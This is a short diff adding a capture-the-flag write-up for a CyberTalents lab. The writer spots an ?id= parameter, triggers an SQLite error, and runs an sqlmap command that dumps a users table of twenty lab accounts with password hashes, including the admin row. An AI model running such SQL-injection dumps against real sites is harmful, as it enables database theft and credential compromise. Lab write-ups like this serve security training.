@@ -1,1 +1,38 @@
-all
+took a quick look on code , no comments , no robots 
+
+when clicking on any read more , noticed  ?id=number  like ?id=1 
+
+try to bruteforce from 1 to 200 > it is just news 
+
+tried to path traversed > sqlite error 😂
+
+using sqlmap sudo sqlmap  -u http://cdcamxwl32pue3e6mk873oykcwzy0w93xgr9gt7zr-web.cybertalentslabs.com/shownews.php?id=1 --batch --dbms=sqlite --tables --dump
+
+
+Database: <current>
+Table: nxf8_users
+[20 entries]
++----+-----------+-------+----------------------+------------------------------------------+
+| id | name      | role  | email                | password                                 |
++----+-----------+-------+----------------------+------------------------------------------+
+| 1  | Maria     | user  | maria@secret.org     | be98eb7d4cd12a19a895066b342dc3d7c599c692 |
+| 2  | Trevor    | user  | trevor@secret.org    | 421f98ddb91ecab75316ae52cd74487a977eab44 |
+| 3  | Jacob     | user  | jacob@secret.org     | 4deef098644aa46e4226467fce424b79118c4dfc |
+| 4  | Paul      | user  | paul@secret.org      | a273ac937188d75c16e1a66efb26f4c192b515bc |
+| 5  | Alex      | user  | alex@secret.org      | 550275136decbd6113d5daf0847cc2b77023849c |
+| 6  | Mira      | user  | mira@secret.org      | f380e7e7ff1b83301465f8e9c534e9517ad11a78 |
+| 7  | Michael   | user  | michael@secret.org   | 43a7735ce30e07194230d82a00e5d8fd9532a800 |
+| 8  | Joshua    | user  | joshua@secret.org    | 912b524607474bae086c65dc22271708cfafcf47 |
+| 9  | Matthew   | user  | matthew@secret.org   | 1ccdcf78f9249002d86d7a559f51161d6228230b |
+| 10 | Ethan     | user  | ethan@secret.org     | a9042888864fcb3928443f6890c2c365c1425bb3 |
+| 11 | Andrew    | user  | andrew@secret.org    | 4c0a9fe14df4950a0187038b2ec8990fabbe5f34 |
+| 12 | Daniel    | user  | daniel@secret.org    | 6f39b098f502399803c53e58fa6448bbc4df0060 |
+| 13 | Anthony   | user  | anthony@secret.org   | 990a28b462c698d69630370e1b7dd226da91c403 |
+| 14 | William   | user  | william@secret.org   | 96f748124d91ac2666099d2e8c07e652eecd3bd7 |
+| 15 | Ryan      | admin | ryan@secret.org      | e2f57b3321c3adb5edf8da53582287c36b0dbcd7 |  <<<<<<<<<====================================
+| 16 | Shila     | user  | shila@secret.org     | f47866f3ac7b429d256d76b229818bd69746dba5 |
+| 17 | David     | user  | david@secret.org     | 1d4e734728f82b0312f1b3abc0a3c63c2c66786a |
+| 18 | Jonathan  | user  | jonathan@secret.org  | 84d4cbae121de2f96964263992af00d6c40588b1 |
+| 19 | Christina | user  | christina@secret.org | cff09074e8c00957465b16545b4fbd920ec34117 |
+| 20 | Gabriel   | user  | gabriel@secret.org   | efcf1d468836853b87b0e7f80733ba20cf509310 |
++----+-----------+-------+----------------------+------------------------------------------+
